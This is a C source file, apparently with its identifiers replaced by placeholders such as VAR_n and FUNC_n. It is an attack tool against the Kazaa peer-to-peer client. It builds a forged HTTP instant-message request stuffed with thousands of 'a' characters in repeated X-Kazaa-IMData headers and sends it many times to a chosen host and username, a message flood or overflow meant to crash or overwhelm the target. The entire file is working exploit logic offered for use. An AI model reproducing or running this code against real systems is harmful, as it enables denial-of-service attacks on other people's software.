
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int buf2 ;
typedef int buf ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ,char*,...) ;
 int FUNC_5 (char*) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int ) ;
 scalar_t__ FUNC_8 (int) ;
 int FUNC_9 (char*,char,int) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,int) ;
 int FUNC_12 (char*,int,char*,...) ;
 int FUNC_13 (int ,int ,int ) ;
 int FUNC_14 (int ) ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_15 (char*,char*) ;
 int FUNC_16 (char*) ;
 int FUNC_17 (int *) ;
 int FUNC_18 (int,char*,int ) ;

int FUNC_19(int VAR_5, char *VAR_6[])
{
   int VAR_7, VAR_8, VAR_9, VAR_10;
   struct hostent *VAR_11;
   struct sockaddr_in VAR_12;
   char VAR_13[4026];
   char VAR_14[5000];
   char *VAR_15;
   int VAR_16, VAR_17, VAR_18;


   FUNC_9(VAR_13, 'a', sizeof(VAR_13));
   VAR_13[sizeof(VAR_13)-1]='\0';
   FUNC_14(FUNC_17(((void*)0)));

   if (VAR_5 < 5)
   {
      FUNC_4(VAR_3,"usage: %s <hostname> <(this*4026) bytes per message> <username_of_target> <number_of_messages>\n", VAR_6[0]);
      FUNC_3(1);
   }
   if ((VAR_11=FUNC_6(VAR_6[1])) == ((void*)0))
   {
      FUNC_10("gethostbyname");
      FUNC_3(1);
   }

   VAR_12.sin_family = VAR_0;
   VAR_12.sin_port = FUNC_7(VAR_1);
   VAR_12.sin_addr = *((struct in_addr *)VAR_11->h_addr);
   FUNC_9(&(VAR_12.sin_zero), '\0', 8);


   VAR_17=(4042*FUNC_0(VAR_6[2]))+280+1;
   VAR_15=(char *)FUNC_8(VAR_17);

   FUNC_12(VAR_15, VAR_17, "GET /.message HTTP/1.1\nHost: 68.10.112.148:1214\nUserAgent: KazaaClient Jan 18 2002 18:53:21\nX-Kazaa-Username: 31337h4x0r\nX-Kazaa-Network: KaZaA\nX-Kazaa-IP: %d:1214\nX-Kazaa-SupernodeIP: %d:1214\nConnection:  open\nX-Kazaa-IMTo: %s@KaZaA\nX-Kazaa-IMType: user_text\n", VAR_9, VAR_9, VAR_6[3]);


   FUNC_12(VAR_14, sizeof(VAR_14), "X-Kazaa-IMData: %s\n", VAR_13);
   for(VAR_10=0;VAR_10<FUNC_0(VAR_6[2]);VAR_10++)
   {
      FUNC_15(VAR_15, VAR_14);
      VAR_10++;
   }
   FUNC_15(VAR_15, "\r\n\r\n\r\n\r\n\r\n");

   FUNC_4(VAR_4, "done preparing packet... sending\n");
   for(VAR_16=0, VAR_10=0;VAR_16<FUNC_0(VAR_6[4]);VAR_16++)
   {
     if ((VAR_7 = FUNC_13(VAR_0, VAR_2, 0)) == -1)
     {
       FUNC_10("socket");
     }
     else
     {
       if (FUNC_2(VAR_7, (struct sockaddr *)&VAR_12,sizeof(struct sockaddr)) == -1)
       {
         FUNC_10("connect");
       }
       else
       {
         FUNC_11("sending %d message\n", VAR_10);
         FUNC_18(VAR_7, VAR_15, FUNC_16(VAR_15));
         VAR_10++;
         FUNC_1(VAR_7);
       }
     }
   }
   FUNC_4(VAR_4, "\n%d out of %d attempted got through\n", VAR_10, VAR_16);
   FUNC_5(VAR_15);
   return 0;
}
